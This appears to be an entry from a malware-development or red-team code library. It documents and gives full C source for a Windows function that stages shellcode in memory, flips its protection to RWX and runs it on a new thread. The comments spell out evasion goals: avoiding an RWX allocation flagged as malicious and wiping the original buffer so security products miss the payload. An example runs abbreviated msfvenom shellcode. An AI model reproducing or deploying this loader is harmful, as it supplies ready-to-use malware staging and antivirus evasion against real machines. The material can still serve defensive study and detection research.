## Local Shellcode Execution via CreateThread

Executes a shellcode buffer in the current process by allocating a `RW` memory region, copying the shellcode into it, flipping the protection to `RWX` with `VirtualProtect`, and spawning a new thread via `CreateThread`. The original shellcode buffer is zeroed out after the copy to reduce in-memory exposure. `WaitForSingleObject` is used to hold the caller until the shellcode thread finishes.

**Usage**

Call `ExecuteShellcode` with the shellcode buffer, its size, and a wait timeout in milliseconds. Pass `INFINITE` to wait forever or a specific millisecond value to time out.

- `IN PBYTE pShellcode`  Base address of the shellcode buffer to execute.
- `IN SIZE_T sShellcodeSize`  Size of `pShellcode` in bytes.
- `IN DWORD dwWaitTime`  Milliseconds to wait for the shellcode thread to finish. Pass `INFINITE` to wait indefinitely.

**Return Value**

`BOOL`  Returns `TRUE` if the shellcode was successfully allocated, written, and executed, otherwise `FALSE`.

- `windows.h`  `PBYTE`, `PVOID`, `BOOL`, `DWORD`, `SIZE_T`, `HANDLE`, `PDWORD`, `IN`, `VirtualAlloc()`, `VirtualProtect()`, `VirtualFree()`, `CreateThread()`, `WaitForSingleObject()`, `GetLastError()`
- `string.h`  `memcpy()`, `memset()`

### Code

```c
#include <windows.h>
#include <string.h>
#include <stdio.h>


BOOL ExecuteShellcode(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize, IN DWORD dwWaitTime)
{
    if (pShellcode == NULL || sShellcodeSize == 0)
        return FALSE;

    PVOID   pShellcodeAddress   = NULL;
    HANDLE  hThread             = NULL;
    DWORD   dwOldProtection     = NULL;

    // Allocate RW memory to hold the shellcode.
    // PAGE_READWRITE is used instead of PAGE_EXECUTE_READWRITE to avoid
    // an immediate RWX allocation which is a common malicious indicator.
    pShellcodeAddress = VirtualAlloc(
        NULL,                       // Let the OS choose the base address.
        sShellcodeSize,             // Size of the allocation in bytes.
        MEM_COMMIT | MEM_RESERVE,   // Reserve and commit pages in one call.
        PAGE_READWRITE              // RW only at allocation time; execute is added later.
    );
    if (pShellcodeAddress == NULL) {
        printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
        return FALSE;
    }
    printf("[i] Allocated Memory At : 0x%p \n", pShellcodeAddress);

    // Copy the shellcode into the allocated region.
    memcpy(pShellcodeAddress, pShellcode, sShellcodeSize);

    // Zero out the original shellcode buffer — it is no longer needed
    // and clearing it reduces the chance of security solutions finding
    // the payload in heap memory.
    memset(pShellcode, '\0', sShellcodeSize);

    // Flip the memory protection from RW to RWX so the shellcode can execute.
    if (!VirtualProtect(
        pShellcodeAddress,          // Base address of the region to modify.
        sShellcodeSize,             // Size of the region in bytes.
        PAGE_EXECUTE_READWRITE,     // New protection: read, write, and execute.
        &dwOldProtection            // Receives the previous protection value.
    )) {
        printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
        VirtualFree(pShellcodeAddress, 0, MEM_RELEASE);
        return FALSE;
    }

    // Spawn a new thread to execute the shellcode.
    // Running in a new thread prevents the shellcode from terminating
    // the main thread when it finishes execution.
    hThread = CreateThread(
        NULL,               // Default security attributes.
        0,                  // Default stack size.
        pShellcodeAddress,  // Thread start address: base of the shellcode buffer.
        NULL,               // No parameter passed to the thread function.
        0,                  // Run immediately.
        NULL                // Thread ID not required.
    );
    if (hThread == NULL) {
        printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
        VirtualFree(pShellcodeAddress, 0, MEM_RELEASE);
        return FALSE;
    }
    printf("[i] Shellcode Thread Created With Handle : 0x%p \n", hThread);

    // Wait for the shellcode thread to finish before returning.
    // INFINITE blocks until the thread exits; a millisecond value times out early.
    WaitForSingleObject(
        hThread,        // Handle to the shellcode thread.
        dwWaitTime      // Timeout in milliseconds, or INFINITE.
    );

    return TRUE;
}
```

**Example**

```c
// msfvenom calc shellcode, abbreviated for the snippet.
unsigned char pPayload[]   = { 0xFC, 0x48, 0x83, 0xE4, 0xF0 /* ... */ };
SIZE_T        sPayloadSize = sizeof(pPayload);

// Stage + execute the shellcode on a new thread, blocking until it exits.
ExecuteShellcode(pPayload, sPayloadSize, INFINITE);
```
